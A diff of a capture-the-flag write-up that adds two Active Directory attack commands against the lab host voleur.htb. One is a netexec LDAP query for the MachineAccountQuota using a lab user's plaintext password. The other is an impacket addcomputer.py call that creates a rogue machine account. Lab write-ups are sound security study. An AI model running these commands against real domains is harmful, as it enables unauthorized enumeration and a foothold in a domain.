@@ -34,13 +34,13 @@
 
 2. Bloodhound doesn't give us a path from credentials given ryan.naylor. After enumerating using netexec ldap, found non zero MachineAccountQuota
 
-``
+`nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -d voleur.htb -k -M maq`
 
 ![image](https://github.com/user-attachments/assets/74968e9e-d30a-434f-b598-03bbd6691242)
 
 3. Using impacket's addcomputer.py script, add a machine account
 
-``
+`addcomputer.py voleur.htb/ryan.naylor:HollowOct31Nyt -computer-name 'TEST$' -computer-pass 'Test123' -dc-ip dc.voleur.htb -dc-host dc.voleur.htb -k`
 
 ![image](https://github.com/user-attachments/assets/d03c42e6-1cba-4b7c-a4fc-7948354beb77)
 
